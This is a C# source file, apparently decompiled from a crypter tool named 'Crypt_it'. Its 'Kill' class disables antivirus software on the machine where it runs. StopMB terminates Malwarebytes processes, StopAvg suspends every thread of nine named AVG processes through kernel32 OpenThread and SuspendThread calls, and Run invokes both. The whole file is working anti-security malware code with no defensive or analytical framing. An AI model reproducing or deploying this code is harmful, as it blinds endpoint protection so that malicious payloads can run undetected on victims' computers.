using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace Crypt_it;

internal sealed class Kill
{
	public enum ThreadAccess
	{
		TERMINATE = 1,
		SUSPEND_RESUME = 2,
		GET_CON = 8,
		SET_CON = 0x10,
		SET_INFORMATION = 0x20,
		QUERY_INFORMATION = 0x40,
		SET_THREAD_TOKEN = 0x80,
		IMPERSONATE = 0x100,
		DIRECT_IMPERSONATION = 0x200
	}

	public static void StopMB()
	{
		Process[] processesByName = Process.GetProcessesByName("mbamgui");
		foreach (Process process in processesByName)
		{
			if (Operators.CompareString(process.MainWindowTitle.Trim(), "Malwarebytes Anti-Malware", false) == 0)
			{
				process.Kill();
			}
		}
		try
		{
			Process[] processesByName2 = Process.GetProcessesByName("mbamgui");
			Process[] array = processesByName2;
			foreach (Process process2 in array)
			{
				process2.Kill();
			}
		}
		catch (Exception)
		{
		}
		Process[] processesByName3 = Process.GetProcessesByName("mbam");
		foreach (Process process3 in processesByName3)
		{
			if (Operators.CompareString(process3.MainWindowTitle.Trim(), "Malwarebytes Anti-Malware", false) == 0)
			{
				process3.Kill();
			}
		}
		try
		{
			Process[] processesByName4 = Process.GetProcessesByName("mbam");
			Process[] array2 = processesByName4;
			foreach (Process process4 in array2)
			{
				process4.Kill();
			}
		}
		catch (Exception)
		{
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern uint SuspendThread(IntPtr hThread);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern uint ResumeThread(IntPtr hThread);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool CloseHandle(IntPtr hHandle);

	private static void SuspendProcess(Process process)
	{
		try
		{
			foreach (object thread in process.Threads)
			{
				ProcessThread processThread = (ProcessThread)thread;
				IntPtr intPtr = OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: false, checked((uint)processThread.Id));
				if (intPtr != IntPtr.Zero)
				{
					SuspendThread(intPtr);
					CloseHandle(intPtr);
				}
			}
		}
		finally
		{
		}
	}

	public static void StopAvg()
	{
		Process[] processesByName = Process.GetProcessesByName("avgidsagent");
		Process[] processesByName2 = Process.GetProcessesByName("avgfws");
		Process[] processesByName3 = Process.GetProcessesByName("avgtray");
		Process[] processesByName4 = Process.GetProcessesByName("avgemcx");
		Process[] processesByName5 = Process.GetProcessesByName("avgwdsvc");
		Process[] processesByName6 = Process.GetProcessesByName("avgnsx");
		Process[] processesByName7 = Process.GetProcessesByName("avgcsrvx");
		Process[] processesByName8 = Process.GetProcessesByName("avgrsx");
		Process[] processesByName9 = Process.GetProcessesByName("ToolbarUpdater");
		try
		{
			SuspendProcess(processesByName[0]);
			SuspendProcess(processesByName2[0]);
			SuspendProcess(processesByName3[0]);
			SuspendProcess(processesByName4[0]);
			SuspendProcess(processesByName5[0]);
			SuspendProcess(processesByName6[0]);
			SuspendProcess(processesByName7[0]);
			SuspendProcess(processesByName8[0]);
			SuspendProcess(processesByName9[0]);
		}
		catch (Exception)
		{
		}
	}

	public static void Run()
	{
		StopAvg();
		StopMB();
	}
}
